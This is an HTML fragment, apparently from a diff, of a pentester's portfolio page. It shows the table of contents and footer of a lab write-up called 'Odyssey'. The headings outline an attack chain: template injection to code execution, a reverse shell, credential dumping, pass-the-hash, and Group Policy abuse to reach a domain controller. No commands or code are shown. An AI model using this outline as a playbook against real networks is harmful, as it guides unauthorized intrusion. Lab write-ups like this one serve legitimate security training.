href="#15-failed-remote-registry-attempt">15. Failed Remote Registry Attempt</a><a class="toc-2" href="#16-extracting-sam-and-system">16. Extracting SAM and SYSTEM</a><a class="toc-2" href="#17-smb-file-transfer">17. SMB File Transfer</a><a class="toc-2" href="#18-dumping-local-password-hashes">18. Dumping Local Password Hashes</a><a class="toc-2" href="#19-administrator-pass-the-hash">19. Administrator Pass-the-Hash</a><a class="toc-2" href="#20-adding-our-user-to-administrators">20. Adding Our User to Administrators</a><a class="toc-2" href="#21-moving-toward-the-domain-controller">21. Moving Toward the Domain Controller</a><a class="toc-2" href="#22-active-directory-enumeration">22. Active Directory Enumeration</a><a class="toc-2" href="#23-collecting-bloodhound-data-with-bloodyad">23. Collecting BloodHound Data with bloodyAD</a><a class="toc-2" href="#24-discovering-a-gpo-abuse-path">24. Discovering a GPO Abuse Path</a><a class="toc-2" href="#25-testing-pygpoabuse">25. Testing pyGPOAbuse</a><a class="toc-2" href="#26-gpo-abuse---administrator">26. GPO Abuse -&gt; Administrator</a><a class="toc-2" href="#27-domain-controller-access">27. Domain Controller Access</a><a class="toc-2" href="#attack-path-summary">Attack Path Summary</a><a class="toc-2" href="#what-i-learned">What I Learned</a><a class="toc-3" href="#1-enumeration-is-more-important-than-exploitation">1. Enumeration is more important than exploitation</a><a class="toc-3" href="#2-credentials-should-be-treated-as-reusable-attack-material">2. Credentials should be treated as reusable attack material</a><a class="toc-3" href="#3-group-membership-can-be-more-important-than-the-username">3. Group membership can be more important than the username</a><a class="toc-3" href="#4-failed-techniques-are-part-of-the-methodology">4. Failed techniques are part of the methodology</a><a class="toc-3" href="#5-local-compromise-can-become-domain-compromise">5. Local compromise can become domain compromise</a><a class="toc-3" href="#6-bloodhound-is-not-the-attack-it-is-a-way-to-understand-relationships">6. BloodHound is not the attack-it is a way to understand relationships</a><a class="toc-2" href="#final-thoughts">Final Thoughts</a></aside> </main> <footer class="footer"> <div class="container footer-inner"> <div> <strong>Samuel Oblika</strong> <p>Penetration testing, red team practice, technical writeups and security research.</p> </div> <div class="footer-links"> <a href="/Website-Portofolio2/writeups/">Writeups</a> <a href="/Website-Portofolio2/contact/">Contact</a> <a href="/Website-Portofolio2/about/">About</a> <a href="https://github.com/Oblika" target="_blank" rel="noreferrer">GitHub</a> <a href="https://www.linkedin.com/in/samueloblika/" target="_blank" rel="noreferrer">LinkedIn</a> </div> <small>Copyright 2026 Samuel Oblika</small> </div> </footer>  </body></html>
+<p>That is what made Odyssey such a valuable lab for practicing a real penetration-testing mindset.</p></div> </article> <aside class="toc"><strong>On this page</strong><a class="toc-2" href="#1-web-01-enumeration">1. Web-01 Enumeration</a><a class="toc-3" href="#port-enumeration--service-discovery">Port Enumeration &amp; Service Discovery</a><a class="toc-2" href="#2-ssh-enumeration">2. SSH Enumeration</a><a class="toc-2" href="#3-web-application-enumeration">3. Web Application Enumeration</a><a class="toc-2" href="#4-server-side-template-injection">4. Server-Side Template Injection</a><a class="toc-3" href="#identifying-the-template-engine">Identifying the Template Engine</a><a class="toc-2" href="#5-ssti---remote-code-execution">5. SSTI -&gt; Remote Code Execution</a><a class="toc-2" href="#6-reverse-shell">6. Reverse Shell</a><a class="toc-2" href="#7-web-01-initial-enumeration">7. Web-01 Initial Enumeration</a><a class="toc-2" href="#8-establishing-ssh-access">8. Establishing SSH Access</a><a class="toc-2" href="#9-web-01-privilege-escalation">9. Web-01 Privilege Escalation</a><a class="toc-2" href="#10-post-exploitation-on-web-01">10. Post-Exploitation on Web-01</a><a class="toc-2" href="#11-testing-discovered-credentials">11. Testing Discovered Credentials</a><a class="toc-2" href="#12-wkst-01-initial-access">12. WKST-01 Initial Access</a><a class="toc-3" href="#operational-consideration">Operational Consideration</a><a class="toc-2" href="#13-workstation-enumeration">13. Workstation Enumeration</a><a class="toc-2" href="#14-discovering-backup-operators">14. Discovering Backup Operators</a><a class="toc-2" href="#15-failed-remote-registry-attempt">15. Failed Remote Registry Attempt</a><a class="toc-2" href="#16-extracting-sam-and-system">16. Extracting SAM and SYSTEM</a><a class="toc-2" href="#17-smb-file-transfer">17. SMB File Transfer</a><a class="toc-2" href="#18-dumping-local-password-hashes">18. Dumping Local Password Hashes</a><a class="toc-2" href="#19-administrator-pass-the-hash">19. Administrator Pass-the-Hash</a><a class="toc-2" href="#20-adding-our-user-to-administrators">20. Adding Our User to Administrators</a><a class="toc-2" href="#21-moving-toward-the-domain-controller">21. Moving Toward the Domain Controller</a><a class="toc-2" href="#22-active-directory-enumeration">22. Active Directory Enumeration</a><a class="toc-2" href="#23-collecting-bloodhound-data-with-bloodyad">23. Collecting BloodHound Data with bloodyAD</a><a class="toc-2" href="#24-discovering-a-gpo-abuse-path">24. Discovering a GPO Abuse Path</a><a class="toc-2" href="#25-testing-pygpoabuse">25. Testing pyGPOAbuse</a><a class="toc-2" href="#26-gpo-abuse---administrator">26. GPO Abuse -&gt; Administrator</a><a class="toc-2" href="#27-domain-controller-access">27. Domain Controller Access</a><a class="toc-2" href="#attack-path-summary">Attack Path Summary</a><a class="toc-2" href="#what-i-learned">What I Learned</a><a class="toc-3" href="#1-enumeration-is-more-important-than-exploitation">1. Enumeration is more important than exploitation</a><a class="toc-3" href="#2-credentials-should-be-treated-as-reusable-attack-material">2. Credentials should be treated as reusable attack material</a><a class="toc-3" href="#3-group-membership-can-be-more-important-than-the-username">3. Group membership can be more important than the username</a><a class="toc-3" href="#4-failed-techniques-are-part-of-the-methodology">4. Failed techniques are part of the methodology</a><a class="toc-3" href="#5-local-compromise-can-become-domain-compromise">5. Local compromise can become domain compromise</a><a class="toc-3" href="#6-bloodhound-is-not-the-attack-it-is-a-way-to-understand-relationships">6. BloodHound is not the attack-it is a way to understand relationships</a><a class="toc-2" href="#final-thoughts">Final Thoughts</a></aside> </main> <footer class="footer"> <div class="container footer-inner"> <div> <strong>Samuel Oblika</strong> <p>Penetration testing, red team practice, technical writeups and security research.</p> </div> <div class="footer-links"> <a href="/writeups/">Writeups</a> <a href="/contact/">Contact</a> <a href="/about/">About</a> <a href="https://github.com/Oblika" target="_blank" rel="noreferrer">GitHub</a> <a href="https://www.linkedin.com/in/samueloblika/" target="_blank" rel="noreferrer">LinkedIn</a> </div> <small>Copyright 2026 Samuel Oblika</small> </div> </footer>  </body></html>
